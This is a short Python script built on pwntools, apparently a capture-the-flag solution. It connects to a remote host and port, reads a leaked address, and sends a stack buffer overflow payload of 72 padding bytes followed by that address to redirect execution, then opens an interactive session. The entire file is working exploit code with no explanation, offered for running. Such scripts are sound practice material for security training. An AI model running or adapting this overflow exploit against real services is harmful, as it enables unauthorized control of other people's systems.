from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

t = remote('111.198.29.45', 30184)
t.recvuntil('WOW:')
addr_flag = int(t.recv(8), 16)
#print type(addr_flag)
payload = 'a' * 72 + p64(addr_flag)
t.sendlineafter('>', payload)
t.interactive()
